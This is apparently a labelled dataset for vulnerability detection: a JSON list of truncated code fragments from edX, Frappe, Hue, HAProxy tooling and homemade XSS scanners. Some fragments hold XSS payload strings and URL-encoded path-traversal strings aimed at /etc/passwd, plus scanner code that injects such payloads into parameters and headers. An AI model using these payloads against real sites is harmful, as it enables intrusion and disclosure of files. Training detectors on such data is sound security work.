[{"snippet_id": 2699, "code": "-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11,", "label": 0}, {"snippet_id": 44834, "code": "'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response[", "label": 0}, {"snippet_id": 7012, "code": ".reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index", "label": 0}, {"snippet_id": 486, "code": ", \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def", "label": 0}, {"snippet_id": 17397, "code": "-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url", "label": 0}, {"snippet_id": 38160, "code": "\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True", "label": 0}, {"snippet_id": 1822, "code": "()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=", "label": 0}, {"snippet_id": 37179, "code": "} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and", "label": 0}, {"snippet_id": 42694, "code": "\t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield", "label": 0}, {"snippet_id": 52296, "code": ".update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.", "label": 0}, {"snippet_id": 2563, "code": "\"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key", "label": 0}, {"snippet_id": 32423, "code": " an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource.com/gitiles/+/master", "label": 0}, {"snippet_id": 38295, "code": ".db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content", "label": 0}, {"snippet_id": 2575, "code": "=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable", "label": 0}, {"snippet_id": 32713, "code": ".wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html", "label": 0}, {"snippet_id": 6510, "code": " assertion. \"\"\" return self.config.getint(self.section, 'sso_session_lifetime') @property def sso_session_mongo_uri(self): \"\"\" SSO session MongoDB connection URI(string). See MongoDB documentation for details", "label": 0}, {"snippet_id": 45592, "code": ".get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission()", "label": 0}, {"snippet_id": 36370, "code": "(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t", "label": 0}, {"snippet_id": 24606, "code": "--noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for", "label": 0}, {"snippet_id": 20302, "code": ". If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd", "label": 0}, {"snippet_id": 37023, "code": ": \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt", "label": 0}, {"snippet_id": 25817, "code": "() if initial else None, ) elif q.type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget", "label": 0}, {"snippet_id": 25042, "code": ").__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course", "label": 0}, {"snippet_id": 39211, "code": "=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t", "label": 0}, {"snippet_id": 9389, "code": ".get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 48311, "code": " < 2: return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted\") if \"article_id\" in request.POST: aid: int=int", "label": 0}, {"snippet_id": 4903, "code": "//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm", "label": 0}, {"snippet_id": 51544, "code": " 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'constance.context_processors.config', 'django.template.context_processors", "label": 0}, {"snippet_id": 24507, "code": ") self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files", "label": 0}, {"snippet_id": 4183, "code": "=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s", "label": 0}, {"snippet_id": 39824, "code": "\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new(", "label": 0}, {"snippet_id": 6714, "code": ") for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'password_reset_link') @property def default_language(self): \"\"\" Default language code to use when looking for web", "label": 0}, {"snippet_id": 21916, "code": " settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+", "label": 0}, {"snippet_id": 50196, "code": " request.write(jsonify(data)) request.finish() del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries def client_disconnect", "label": 0}, {"snippet_id": 2478, "code": "-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload", "label": 0}, {"snippet_id": 42958, "code": "\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname", "label": 0}, {"snippet_id": 24092, "code": " num_processes=2, verbosity=3) with self.assertRaises(BuildFailure): BokChoyTestSuite.verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases.", "label": 0}, {"snippet_id": 42961, "code": " values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname", "label": 0}, {"snippet_id": 38854, "code": " self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}", "label": 0}, {"snippet_id": 50726, "code": " This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict): Options-dict with the following keys understood: -raw(bool): No parsing", "label": 0}, {"snippet_id": 8360, "code": "<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 10228, "code": "=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS", "label": 1}, {"snippet_id": 37974, "code": ".blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context", "label": 0}, {"snippet_id": 31070, "code": ", tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip]) \t\t\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd", "label": 0}, {"snippet_id": 12234, "code": "]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book", "label": 1}, {"snippet_id": 23934, "code": ": test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means", "label": 0}, {"snippet_id": 49230, "code": "=self.column_id: if column.startswith(\"-\"): new_query.append(c) else: new_query.append('-{}'.format(c)) else: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: ", "label": 0}, {"snippet_id": 11802, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url", "label": 0}, {"snippet_id": 32631, "code": " os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions", "label": 0}, {"snippet_id": 29372, "code": "\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept", "label": 0}, {"snippet_id": 47594, "code": " f.add_content(TextField(name='email')) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name')) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect'", "label": 0}, {"snippet_id": 33725, "code": " get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog'", "label": 0}, {"snippet_id": 44318, "code": ".user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor", "label": 0}, {"snippet_id": 36255, "code": "(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields", "label": 0}, {"snippet_id": 48165, "code": "(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user,", "label": 0}, {"snippet_id": 10823, "code": ", None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p", "label": 0}, {"snippet_id": 22632, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)", "label": 0}, {"snippet_id": 37497, "code": " \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context", "label": 0}, {"snippet_id": 53778, "code": " requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\"", "label": 1}, {"snippet_id": 6454, "code": " connection URI(string). See MongoDB documentation for details. \"\"\" return self.config.get(self.section, 'userdb_mongo_uri') @property def userdb_mongo_database(self): \"\"\" UserDB database name. \"\"\" return self", "label": 0}, {"snippet_id": 19829, "code": " of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, ", "label": 0}, {"snippet_id": 48227, "code": " HttpResponseRedirect from..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation from.magic import get_current_user import json import datetime RESERVATION_CONSTRUCTION_COOKIE_KEY: str=", "label": 0}, {"snippet_id": 37804, "code": "\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https", "label": 0}, {"snippet_id": 11227, "code": "), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save", "label": 0}, {"snippet_id": 28705, "code": ")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <", "label": 0}, {"snippet_id": 51975, "code": " reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib", "label": 0}, {"snippet_id": 52305, "code": "}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return", "label": 0}, {"snippet_id": 8247, "code": "('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth", "label": 0}, {"snippet_id": 24268, "code": " import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color,", "label": 0}, {"snippet_id": 12723, "code": ".MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete'", "label": 0}, {"snippet_id": 14392, "code": " settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 20332, "code": "(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\"", "label": 0}, {"snippet_id": 3519, "code": " for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path", "label": 0}, {"snippet_id": 50313, "code": "=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def mode_keepalive", "label": 0}, {"snippet_id": 54513, "code": " from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm)", "label": 0}, {"snippet_id": 15869, "code": "\"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url", "label": 0}, {"snippet_id": 29343, "code": " \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path')] \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql", "label": 0}, {"snippet_id": 48200, "code": ")) return redirect(\"/admin/media/add\") def action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user", "label": 0}, {"snippet_id": 90, "code": " for key,value in parsed_query.items(): try: logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value", "label": 1}, {"snippet_id": 26132, "code": "-display-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name", "label": 0}, {"snippet_id": 7098, "code": ".views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P", "label": 0}, {"snippet_id": 26497, "code": "%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "label": 0}, {"snippet_id": 4614, "code": "'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', ", "label": 0}, {"snippet_id": 41513, "code": "\t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value", "label": 0}, {"snippet_id": 11883, "code": ".views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if", "label": 0}, {"snippet_id": 34760, "code": " datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in", "label": 0}, {"snippet_id": 10195, "code": " store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def", "label": 0}, {"snippet_id": 3403, "code": " payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload", "label": 0}, {"snippet_id": 40198, "code": "\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format", "label": 0}, {"snippet_id": 32081, "code": "(\"identity\", \"identity:update_mapping\"),) class DeleteMappingsAction(tables.DeleteAction): @staticmethod def action_present(count): return ungettext_lazy( u\"Delete Mapping\", u\"Delete Mappings\", count )", "label": 0}, {"snippet_id": 5257, "code": "'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', ", "label": 0}, {"snippet_id": 23800, "code": " name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{", "label": 0}, {"snippet_id": 17650, "code": ".accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/", "label": 0}, {"snippet_id": 12400, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$'", "label": 0}, {"snippet_id": 26960, "code": " with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\"", "label": 0}, {"snippet_id": 19340, "code": "(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override", "label": 1}, {"snippet_id": 30326, "code": " stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops", "label": 0}, {"snippet_id": 50539, "code": " needs to be done, such as initializing or sending/receving data through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request)", "label": 0}, {"snippet_id": 37903, "code": ": \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`", "label": 0}, {"snippet_id": 13843, "code": ", name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position", "label": 0}, {"snippet_id": 19370, "code": " self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir", "label": 0}, {"snippet_id": 41358, "code": "=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t", "label": 0}, {"snippet_id": 54704, "code": "(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form", "label": 0}, {"snippet_id": 18647, "code": "\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 50382, "code": ".time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0] cmdarray=json.loads(request.args.get('data')[0]) sess.sessionhandler.data_in(sess, **{cmdarray[0]:[cmdarray", "label": 1}, {"snippet_id": 1475, "code": " import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder", "label": 1}, {"snippet_id": 24975, "code": ".tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode", "label": 0}, {"snippet_id": 32627, "code": "(full_path): self._DoDirListing(full_path) elif os.path.exists(full_path): self._DoRawSourceFile(full_path) else: self._DoUnknown() def _DoMD(self, path): extensions=[ 'markdown.extensions.def_list', 'markdown", "label": 0}, {"snippet_id": 837, "code": " import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[", "label": 0}, {"snippet_id": 32168, "code": "): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\"", "label": 0}, {"snippet_id": 32866, "code": "._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>", "label": 1}, {"snippet_id": 46786, "code": " MC_KEY_N_COMMENTS='comment:%s:n_comments' MC_KEY_COMMNET_IDS_LIKED_BY_USER='react:comment_ids_liked_by:%s:%s' class Comment(ReactMixin, BaseModel): github_id=fields.IntField() post_id=fields.IntField(", "label": 0}, {"snippet_id": 51828, "code": "'console':{ 'class': 'logging.StreamHandler', 'formatter': 'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s", "label": 0}, {"snippet_id": 53607, "code": ", c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords", "label": 0}, {"snippet_id": 27289, "code": "[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception", "label": 1}, {"snippet_id": 6324, "code": " listen on(integer). \"\"\" return self.config.getint(self.section, 'listen_port') @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate config file with SAML related parameters. \"\"", "label": 0}, {"snippet_id": 18821, "code": " url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 24391, "code": " set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self)", "label": 0}, {"snippet_id": 23330, "code": "/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include", "label": 0}, {"snippet_id": 46750, "code": " from tortoise.query_utils import Q from arq import create_pool from config import REDIS_URL from.base import BaseModel from.mc import cache, clear_mc from.user import GithubUser from.consts import K_COMMENT", "label": 0}, {"snippet_id": 51842, "code": "(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '%(log_color)s%(asctime)s\\t%(levelname)-8s -' '%(message)s', 'datefmt': '%Y-%m-", "label": 0}, {"snippet_id": 37572, "code": " as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title", "label": 0}, {"snippet_id": 29131, "code": " commands, print_out=\"1\") \t def waf_install(serv, **kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') 